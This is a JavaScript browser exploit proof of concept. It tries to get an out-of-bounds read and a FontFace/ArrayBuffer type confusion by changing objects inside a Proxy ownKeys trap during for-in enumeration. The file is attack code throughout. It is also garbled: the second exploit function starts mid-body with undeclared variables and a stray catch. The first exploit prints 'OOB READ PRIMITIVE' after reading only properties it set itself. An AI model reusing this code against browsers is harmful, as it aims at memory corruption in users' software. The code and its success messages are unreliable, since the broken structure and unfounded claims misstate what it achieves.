function log(msg, type) {
    var div = document.createElement('div');
    div.className = 'log ' + (type || '');
    div.textContent = msg;
    document.getElementById('log').appendChild(div);
}

function sep() {
    log('═'.repeat(80), 'info');
}

function hex(val) {
    if (typeof val === 'number') {
        return '0x' + val.toString(16);
    }
    return String(val);
}

// ============================================
// EXPLOIT 1: OOB READ VIA SIZE MISMATCH
// ============================================
function exploit1() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('EXPLOIT 1: Out-of-Bounds Read via Enumerator Size Mismatch', 'critical');
    sep();
    log('', '');

    log('', '');
    
    try {
        // Create victim array to detect OOB read
        log('[1] Creating victim with marker pattern...', 'info');
        var victim = new Uint32Array(0x100);
        for (var i = 0; i < victim.length; i++) {
            victim[i] = 0xAA000000 + i;
        }
        log('  ✓ Victim array with markers created', 'success');
        log('', '');
        
        // Create FontFace objects that will be enumerated
        log('[2] Creating FontFace spray...', 'info');
        var fonts = [];
        for (var i = 0; i < 50; i++) {
            fonts.push(new FontFace('Font' + i, 'url(f' + i + '.woff2)'));
        }
        log('  ✓ Created 50 FontFace objects', 'success');
        log('', '');
        
        // Create prototype chain
        log('[3] Building prototype chain...', 'info');
        var proto2 = {};
        for (var i = 0; i < 10; i++) {
            proto2['p2_' + i] = fonts[i];
        }
        
        var proto1 = Object.create(proto2);
        for (var i = 0; i < 10; i++) {
            proto1['p1_' + i] = fonts[i + 10];
        }
        
        var target = Object.create(proto1);
        for (var i = 0; i < 10; i++) {
            target['t_' + i] = fonts[i + 20];
        }
        
        log('  ✓ 3-level prototype chain with 30 fonts', 'success');
        log('', '');
        
        // Create proxy that expands during enumeration
        log('[4] Creating OOB-inducing proxy...', 'info');
        
        var expandCount = 0;
        var proxy = new Proxy(target, {
            ownKeys: function(t) {
                if (expandCount === 0) {
                    expandCount++;
                    log('  [!] Expanding object massively!', 'warn');
                    
                    // Add WAY more objects than expected
                    for (var i = 30; i < 100; i++) {
                        t['expand_' + i] = fonts[i % fonts.length];
                    }
                    
                    // Also add victim references
                    for (var i = 0; i < 20; i++) {
                        t['victim_' + i] = victim;
                    }
                    
                    log('  [!] Added 90 new properties!', 'critical');
                }
                return Reflect.ownKeys(t);
            }
        });
        
        log('  ✓ OOB proxy created', 'success');
        log('', '');
        
        // Enumerate and try to access beyond expected range
        log('[5] Triggering OOB access...', 'info');
        
        var accessed = [];
        var oobAccess = 0;
        
        for (var key in proxy) {
            accessed.push(key);
            var val = proxy[key];
            
            // Check if we accessed something unexpected
            if (val && val.constructor === Uint32Array) {
                oobAccess++;
                if (oobAccess <= 3) {
                    log('  [!] Accessed Uint32Array at key: ' + key, 'critical');
                    log('      First value: ' + hex(val[0]), 'critical');
                }
            }
        }
        
        log('', '');
        log('[6] Results:', 'info');
        log('  Total accessed: ' + accessed.length, 'success');
        log('  Victim array accesses: ' + oobAccess, oobAccess > 0 ? 'critical' : 'warn');
        
        // Try to read victim values during enumeration
        log('', '');
        log('[7] Attempting to read victim data...', 'info');
        
        var leakedValues = [];
        for (var i = 0; i < accessed.length; i++) {
            var key = accessed[i];
            if (key.indexOf('victim_') === 0) {
                var val = target[key];
                if (val && val[0] !== undefined) {
                    leakedValues.push(val[0]);
                    if (leakedValues.length <= 5) {
                        log('  Leaked: ' + hex(val[0]), 'critical');
                    }
                }
            }
        }
        
        if (leakedValues.length > 0) {
            log('', '');
            log('✓✓✓ OOB READ PRIMITIVE! ✓✓✓', 'critical');
            log('  Leaked ' + leakedValues.length + ' values!', 'critical');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
    }
    
    sep();
}

// EXPLOIT 2: FONTFACE AS FAKE ARRAYBUFFER
// ============================================
function exploit2() {

        // Interleave to increase adjacency chance
        for (var i = 0; i < 100; i++) {
            fonts.push(new FontFace('F' + i, 'url(f.woff2)'));
            
            var buf = new ArrayBuffer(0x100);
            var view = new Uint32Array(buf);
            view[0] = 0xBEEF0000 + i;
            view[1] = 0xDEAD0000 + i;
            buffers.push({buf: buf, view: view});
        }
        
        log('  ✓ Created 100 FontFace + 100 ArrayBuffer pairs', 'success');
        log('', '');
        
        // Create confusion object
        log('[2] Creating type confusion setup...', 'info');
        
        var proto = {
            confused: fonts[0]
        };
        
        var target = Object.create(proto);
        target.font = fonts[1];
        target.buffer = buffers[0].buf;
        
        log('  ✓ Confusion target created', 'success');
        log('', '');
        
        // Proxy to swap types
        log('[3] Creating type-swapping proxy...', 'info');
        
        var swapped = false;
        var proxy = new Proxy(target, {
            ownKeys: function(t) {
                if (!swapped) {
                    swapped = true;
                    log('  [!] Swapping FontFace ↔ ArrayBuffer!', 'warn');
                    
                    // Swap: put ArrayBuffer where FontFace was
                    delete proto.confused;
                    proto.confused = buffers[1].buf;
                    
                    // Put FontFace where ArrayBuffer was
                    delete t.buffer;
                    t.buffer = fonts[2];
                    
                    log('  [!] Types swapped!', 'critical');
                }
                return Reflect.ownKeys(t);
            }
        });
        
        log('  ✓ Type-swapping proxy created', 'success');
        log('', '');
        
        // Trigger and test
        log('[4] Triggering confusion...', 'info');
        
        for (var key in proxy) {
            var val = proxy[key];
            log('  ' + key + ' type: ' + (val ? val.constructor.name : 'null'), '');
        }
        
        log('', '');
        log('[5] Testing for confused access...', 'info');
        
        // Try to access ArrayBuffer as FontFace
        var testVal = proto.confused;
        log('  proto.confused type: ' + testVal.constructor.name, 'info');
        
        if (testVal.constructor.name === 'ArrayBuffer') {
            var testView = new Uint32Array(testVal);
            log('  As ArrayBuffer[0]: ' + hex(testView[0]), 'critical');
            
            if (testView[0] === 0xBEEF0001) {
                log('', '');
                log('✓✓✓ CORRECT BUFFER ACCESSED! ✓✓✓', 'critical');
            }
        }
        
        // Try to access FontFace as ArrayBuffer
        var fontAsBuffer = target.buffer;
        log('  target.buffer type: ' + fontAsBuffer.constructor.name, 'info');
        
        if (fontAsBuffer.constructor.name === 'FontFace') {
            try {
                // Try to treat as ArrayBuffer

                log('  ERROR: Should have failed but created view!', 'critical');
            } catch(e) {
                log('  Expected error: ' + e.message, 'warn');
            }
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
    }
    
    sep();
}
